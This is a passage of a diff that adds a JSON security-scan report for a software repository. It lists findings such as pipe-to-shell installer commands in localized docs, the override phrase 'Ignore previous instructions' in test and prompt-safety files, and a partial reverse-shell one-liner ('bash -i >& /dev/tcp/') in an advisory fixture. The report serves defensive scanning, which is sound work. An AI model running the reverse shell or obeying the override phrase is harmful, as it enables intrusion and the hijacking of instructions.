+      "file_sha256": "d51a60d6ee62a89291bec9f8d8f6ca7fb92de270ce14132c99b9f89e7ea04b77"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/ko/module-e1-execution-playbook.md",
+      "line": 464,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "25f8cb0ac62c49a0ff2b9b6775808f74b009f04a49ccdb598d908a1faf98d249"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/ar/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "6c0d827523d10ba518e35f5e6bbda73d513fd620b6bf67f10b7600cba8f727a2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/ar/module-e1-execution-playbook.md",
+      "line": 464,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "c78d826c022362a4c1d8009b39814b0998d947b0c3cec9bd9c08d99e67b20245"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/pt-BR/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "e6b326f22629b40ff47ed89e6a6541cc5cf544865cd119633e4bd508983a030b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/pt-BR/module-e1-execution-playbook.md",
+      "line": 464,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "5231dea9ebf222b2bb2bf8c776dfe5c9e1163d3f7a5e6cd0216600f915d21787"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/es/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "feb29a8d74d43059f1a300b1401928e827868178c64b4ba25e1021fab3d9f6f4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/es/module-e1-execution-playbook.md",
+      "line": 464,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "1527750319dfa8fcf6c0f77e5f792d0ead1826aa12e0368dfb3715820b0d32fb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/zh/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "fdcef3bd4574f76c1ff11c69f6b779df098432ec0400b9550b64d6ed13898288"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/zh/module-e1-execution-playbook.md",
+      "line": 464,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "9ac2896e27c58706a51f646d1b6f2a1104ac3a3994546ba18ba03d087272fcad"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/src-tauri/src/release_changelog/github_tests.rs",
+      "line": 386,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "2183dd778b2845a31695f46e334223b2080aa0f0a7f0fbfea84fffa0c2eddff1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/src-tauri/src/release_changelog/parse_tests.rs",
+      "line": 518,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "905657725f9466833a5142bb0f8ea490bd6a231929d0eda797ff2a8305bbee79"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/src-tauri/src/llm_judge.rs",
+      "line": 11,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "0235a436d531e2eddc6579a3a3492159dd884ff10c86da045216bf975362d2c6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/src-tauri/src/prompt_safety.rs",
+      "line": 7,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "96f73114a189c2298fd9c5d095d0bab7b58d9832ab320d47dcbc09fd9eb59939"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/src-tauri/tests/conformance/osv/GHSA-5j98-mcp5-4vw2.json",
+      "line": 1,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "309c22b5afef9688954c04c105de424db92cd0946136246c453c575f9023c569"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "4da.ai",
+    "4da.dev",
+    "a.com",
+    "a.example",
+    "abr.business.gov.au",
+    "api.anthropic.com",
+    "api.deepseek.com",
+    "api.groq.com",
+    "api.mistral.ai",
+    "api.resend.com",
+    "api.together.xyz",
+    "b.com",
+    "b.example",
+    "babel.dev",
+    "billing.stripe.com",
+    "blog.deno.com",
+    "blog.rust-lang.org",
+    "blog.wybxc.cc",
+    "c.com",
+    "c.example",
+    "client.crisp.chat",
+    "codeberg.org",
+    "codeload.github.com",
+    "connectonline.asic.gov.au",
+    "console.anthropic.com",
+    "crates.io",
+    "d.example",
+    "d3js.org",
+    "docs.rs",
+    "evil.example",
+    "example.com",
+    "example.test",
+    "fedi.lwn.net",
+    "feross.org",
+    "files.pythonhosted.org",
+    "fonts.googleapis.com",
+    "fonts.gstatic.com",
+    "fontsource.org",
+    "fresh.example",
+    "gems.example.com",
+    "github.com",
+    "gitlab.com",
+    "gitlab.gnome.org",
+    "gitlab.redox-os.org",
+    "go.dev",
+    "hacker-news.firebaseio.com",
+    "idp.example.com",
+    "img.shields.io",
+    "k.example",
+    "keepachangelog.com",
+    "link.com",
+    "news.ycombinator.com",
+    "nvd.nist.gov",
+    "ollama.com",
+    "openrouter.ai",
+    "osv.dev",
+    "own.example",
+    "pkg.go.dev",
+    "platform.openai.com",
+    "pypi.example.com",
+    "pypi.org",
+    "react.dev",
+    "reactflow.dev",
+    "registry.npmjs.com",
+    "registry.npmjs.org",
+    "registry.yarnpkg.com",
+    "relay.4da.ai",
+    "rubygems.org",
+    "rustsec.org",
+    "safedep.io",
+    "schema.org",
+    "scripts.sil.org",
+    "sh.rustup.rs",
+    "stale.example",
+    "stripe.com",
+    "tanstack.com",
+    "test.com",
+    "twitter.com",
+    "us.i.posthog.com",
+    "vite.dev",
+    "www.apache.org",
+    "www.blog.wybxc.cc",
+    "www.contributor-covenant.org",
+    "www.cve.org",
+    "www.deno.com",
+    "www.example.com",
+    "www.google.com",
+    "www.i18next.com",
+    "www.npmjs.com",
+    "www.patreon.com",
+    "www.safedep.io",
+    "www.sitemaps.org",
+    "www.typescriptlang.org",
+    "www.w3.org",
+    "www.x.com",
+    "www.youtube.com",
+    "x.com",
+    "yourapp.com",
+    "youtube.com"
+  ],
+  "install_script": false,
+  "score": "high"
+}
